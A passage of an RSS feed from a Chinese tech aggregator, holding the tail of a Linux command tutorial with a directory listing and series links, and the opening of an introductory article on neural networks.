&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-15&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-16&quot;&gt;总计&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-18&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-20&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-21&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-22&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-23&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0076 seconds] --&gt;

&lt;/div&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109750&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109750votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109750&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-09-109750-a9557dc41.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-09-109750-a9557dc41.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>神经网络浅讲：从神经元到深度学习</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;神经网络是一门重要的机器学习技术。它是目前最为火热的研究方向–深度学习的基础。学习神经网络不仅可以让你掌握一门强大的机器学习方法，同时也可以更好地帮助你理解深度学习技术。&lt;/p&gt;
&lt;p&gt;本文以一种简单的，循序的方式讲解神经网络。适合对神经网络了解不多的同学。本文对阅读没有一定的前提要求，但是&lt;a href=&quot;http://blog.jobbole.com/83400/&quot; target=&quot;_blank&quot;&gt;懂一些机器学习基础&lt;/a&gt;会更好地帮助理解本文。&lt;/p&gt;
&lt;p&gt;神经网络是一种模拟人脑的神经网络以期能够实现类人工智能的机器学习技术。人脑中的神经网络是一个非常复杂的组织。成人的大脑中估计有1000亿个神经元之多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/dba293db936ba4f2d3fea352fccd8ce9.jpg&quot; alt=&quot;&quot; width=&quot;429&quot; height=&quot;321&quot;&gt;&lt;/p&gt;
&lt;p&gt;图1 人脑神经网络&lt;/p&gt;
&lt;p&gt;那么机器学习中的神经网络是如何实现这种模拟的，并且达到一个惊人的良好效果的？通过本文，你可以了解到这些问题的答案，同时还能知道神经网络的历史，以及如何较好地学习它。&lt;/p&gt;
&lt;p&gt;由于本文较长，为方便读者，以下是本文的目录：&lt;/p&gt;
&lt;p&gt;一.&lt;a href=&quot;#first&quot;&gt;前言&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;二.&lt;a href=&quot;#second&quot;&gt;神经元&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;三.&lt;a href=&quot;#third&quot;&gt;单层神经网络（感知器）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;四.&lt;a href=&quot;#fourth&quot;&gt;两层神经网络（多层感知器）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;五.&lt;a href=&quot;#fifth&quot;&gt;多层神经网络（深度学习）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;六.&lt;a href=&quot;#sixth&quot;&gt;回顾&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;七.&lt;a href=&quot;#seventh&quot;&gt;展望&lt;/a&gt;&lt;a href=&quot;#sixth&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;八.&lt;a href=&quot;#eighth&quot;&gt;总结&lt;/a&gt;&lt;a href=&quot;#nineth&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;九.&lt;a href=&quot;#nineth&quot;&gt;后记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;十.&lt;a href=&quot;#tenth&quot;&gt;备注&lt;/a&gt;&lt;a href=&quot;#tenth&quot;&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;first&quot;&gt;&lt;/a&gt;一. 前言&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让我们来看一个经典的神经网络。这是一个包含三个层次的神经网络。红色的是&lt;strong&gt;输入层&lt;/strong&gt;，绿色的是&lt;strong&gt;输出层&lt;/strong&gt;，紫色的是&lt;strong&gt;中间层&lt;/strong&gt;（也叫&lt;strong&gt;隐藏层&lt;/strong&gt;）。输入层有3个输入单元，隐藏层有4个单元，输出层有2个单元。后文中，我们统一使用这种颜色来表达神经网络的结构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/9645450cc78d6a82bea36d0e6cb704f1.jpg&quot; alt=&quot;&quot; width=&quot;329&quot; height=&quot;463&quot;&gt;&lt;/p&gt;
&lt;p&gt;图2 神经网络结构图&lt;/p&gt;
&lt;p&gt;在开始介绍前，有一些知识可以先记在心里：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设计一个神经网络时，输入层与输出层的节点数往往是固定的，中间层则可以自由指定；&lt;/li&gt;
&lt;li&gt;神经网络结构图中的拓扑与箭头代表着&lt;strong&gt;预测&lt;/strong&gt;过程时数据的流向，跟&lt;strong&gt;训练&lt;/strong&gt;时的数据流有一定的区别；&lt;/li&gt;
&lt;li&gt;结构图里的关键不是圆圈（代表“神经元”），而是连接线（代表“神经元”之间的连接）。每个连接线对应一个不同的&lt;strong&gt;权重&lt;/strong&gt;（其值称为&lt;strong&gt;权值&lt;/strong&gt;），这是需要训练得到的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除了从左到右的形式表达的结构图，还有一种常见的表达形式是从下到上来表示一个神经网络。这时候，输入层在图的最下方。输出层则在图的最上方，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/c1860fbdb5dca467323fe52856cdf0a7.jpg&quot; alt=&quot;&quot; width=&quot;486&quot; height=&quot;313&quot;&gt;&lt;/p&gt;
&lt;p&gt;图3 从下到上的神经网络结构图&lt;/p&gt;
&lt;p&gt;从左到右的表达形式以Andrew Ng和LeCun的文献使用较多，Caffe里使用的则是从下到上的表达。在本文中使用Andrew Ng代表的从左到右的表达形式。&lt;/p&gt;
&lt;p&gt;下面从简单的神经元开始说起，一步一步介绍神经网络复杂结构的形成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;second&quot;&gt;&lt;/a&gt;二. 神经元&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.引子&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于神经元的研究由来已久，1904年生物学家就已经知晓了神经元的组成结构。&lt;/p&gt;
&lt;p&gt;一个神经元通常具有多个&lt;strong&gt;树突&lt;/strong&gt;，主要用来接受传入信息；而&lt;strong&gt;轴突&lt;/strong&gt;只有一条，轴突尾端有许多轴突末梢可以给其他多个神经元传递信息。轴突末梢跟其他神经元的树突产生连接，从而传递信号。这个连接的位置在生物学上叫做“&lt;strong&gt;突触&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;人脑中的神经元形状可以用下图做简单的说明：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/9a6526b952cd84ae0044d718b985aa35.jpg&quot; alt=&quot;&quot; width=&quot;477&quot; height=&quot;284&quot;&gt;&lt;/p&gt;
&lt;p&gt;图4 神经元&lt;/p&gt;
&lt;p&gt;1943年，心理学家McCulloch和数学家Pitts参考了生物神经元的结构，发表了抽象的神经元模型MP。在下文中，我们会具体介绍神经元模型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/703340d104ea5e53fcf46a6f19a0fe33.jpg&quot; alt=&quot;&quot; width=&quot;181&quot; height=&quot;238&quot;&gt;   &lt;img src=&quot;/images/jobbole.com/399432cb3748bab59f986d84eaaec219.jpg&quot; alt=&quot;&quot; width=&quot;167&quot; height=&quot;237&quot;&gt;&lt;/p&gt;
&lt;p&gt;图5 Warren McCulloch（左）和 Walter Pitts（右）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;神经元模型是一个包含输入，输出与计算功能的模型。输入可以类比为神经元的树突，而输出可以类比为神经元的轴突，计算则可以类比为细胞核。&lt;/p&gt;
&lt;p&gt;下图是一个典型的神经元模型：包含有3个输入，1个输出，以及2个计算功能。&lt;/p&gt;
&lt;p&gt;注意中间的箭头线。这些线称为“连接”。每个上有一个“权值”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/63e9e142b27fb7435ab442d196a74169.jpg&quot; alt=&quot;&quot; width=&quot;608&quot; height=&quot;354&quot;&gt;&lt;/p&gt;
